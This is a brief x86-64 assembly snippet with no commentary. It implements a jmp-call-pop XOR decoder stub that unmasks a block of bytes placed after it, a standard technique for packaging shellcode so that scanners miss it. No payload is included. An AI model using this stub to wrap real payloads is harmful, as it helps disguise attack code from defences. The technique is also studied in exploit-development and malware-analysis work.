BITS 64
jmp short L1
L2:
	pop rsi
	xor rcx, rcx
	mov cl, 0x45
L3:
	xor byte [rsi + rcx], 0x74
	sub cl, 1
	jnz short L3
	xor byte [rsi + rcx], 0x74
	jmp short L4
L1:
	call L2
L4: